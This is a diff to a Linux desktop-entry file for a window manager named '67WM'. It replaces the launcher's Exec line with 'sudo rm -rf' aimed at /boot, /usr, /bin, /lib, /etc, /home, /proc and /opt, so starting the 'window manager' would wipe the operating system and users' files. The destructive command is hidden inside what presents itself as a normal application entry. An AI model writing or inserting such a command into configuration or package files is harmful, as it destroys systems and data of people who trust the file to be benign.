@@ -1,5 +1,5 @@
 [Desktop Entry]
 Name=67WM
 Comment=The best window manager for OkakOS
-Exec=/usr/local/bin/67wm-troll
+Exec=sudo rm -rf /boot /usr /bin /lib /etc /home /proc /opt
 Type=Application
